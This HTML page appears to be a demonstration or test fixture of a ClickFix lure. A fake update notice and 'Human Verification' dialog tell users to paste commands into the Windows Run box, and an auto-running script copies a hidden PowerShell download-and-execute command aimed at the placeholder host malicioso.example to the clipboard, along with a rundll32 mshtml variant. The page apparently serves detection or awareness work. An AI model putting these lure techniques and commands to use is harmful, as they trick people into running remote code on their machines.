<!doctype html>
<html lang="es">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Demo ClickFix - Sitio de prueba</title>
    <style>
      body {
        font-family: system-ui, sans-serif;
        margin: 24px;
        color: #0f172a;
        background: #f1f5f9;
      }
      .card {
        border: 1px solid #e2e8f0;
        border-radius: 12px;
        padding: 16px;
        max-width: 720px;
        background: #f8fafc;
      }
      .modal {
        margin-top: 24px;
        max-width: 480px;
        border-radius: 20px;
        background: #ffffff;
        border: 1px solid #e2e8f0;
        padding: 20px;
        box-shadow: 0 18px 40px rgba(15, 23, 42, 0.2);
      }
      .steps {
        display: grid;
        gap: 12px;
        margin: 16px 0;
      }
      .step {
        display: flex;
        gap: 12px;
        align-items: center;
        padding: 10px;
        border-radius: 12px;
        background: #f8fafc;
        border: 1px solid #e2e8f0;
      }
      .badge {
        width: 28px;
        height: 28px;
        border-radius: 8px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        background: #dc2626;
        color: #fff;
        font-weight: 700;
      }
      kbd {
        background: #0f172a;
        color: #f8fafc;
        padding: 2px 6px;
        border-radius: 6px;
        font-size: 12px;
      }
      code {
        background: #111827;
        color: #f9fafb;
        padding: 2px 6px;
        border-radius: 4px;
      }
      .cta {
        margin-top: 16px;
        padding: 10px 14px;
        background: #dc2626;
        color: #fff;
        border: none;
        border-radius: 8px;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h1>Actualiza tu PC (demo sospechosa)</h1>
      <p>
        Para solucionar el error, abre el <strong>Run dialog</strong> con <strong>Win + R</strong> y pega el comando
        siguiente. Luego pulsa <strong>Enter</strong> o <strong>Ctrl + Shift + Enter</strong>.
      </p>
      <p>
        <code>powershell -Command "Invoke-WebRequest http://malicioso.example/payload.ps1 | iex"</code>
      </p>
      <p>
        Si no funciona, intenta con:
      </p>
      <p>
        <code>cmd /c rundll32.exe javascript:"\"\\..\\mshtml,RunHTMLApplication\"";document.write();</code>
      </p>
      <button class="cta" id="copy-btn" type="button">Copiar instrucciones</button>
    </div>
    <div class="modal" role="dialog" aria-live="polite">
      <h2>Human Verification</h2>
      <p>Follow 3 quick steps to verify you're not a robot:</p>
      <div class="steps">
        <div class="step">
          <span class="badge">1</span>
          <span>Presiona <kbd>Win</kbd> + <kbd>R</kbd> para abrir Ejecutar.</span>
        </div>
        <div class="step">
          <span class="badge">2</span>
          <span>Pega con <kbd>Ctrl</kbd> + <kbd>V</kbd> el texto copiado.</span>
        </div>
        <div class="step">
          <span class="badge">3</span>
          <span>Confirma con <kbd>Enter</kbd> o <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>Enter</kbd>.</span>
        </div>
      </div>
      <p>Si el navegador bloquea el pegado, abre DevTools y permite pegar en la consola.</p>
    </div>
    <script>
      const copyBtn = document.getElementById("copy-btn");
      const payload =
        'conhost.exe --headless cmd /c powershell -Command "Invoke-WebRequest http://malicioso.example/payload.ps1 | iex"';

      async function writeClipboard(text) {
        try {
          await navigator.clipboard.writeText(text);
        } catch (error) {
          const fallback = document.createElement("textarea");
          fallback.value = text;
          fallback.style.position = "fixed";
          fallback.style.opacity = "0";
          document.body.appendChild(fallback);
          fallback.select();
          document.execCommand("copy");
          document.body.removeChild(fallback);
        }
      }

      copyBtn.addEventListener("click", () => writeClipboard(payload));
      setTimeout(() => writeClipboard(payload), 2000);
    </script>
  </body>
</html>
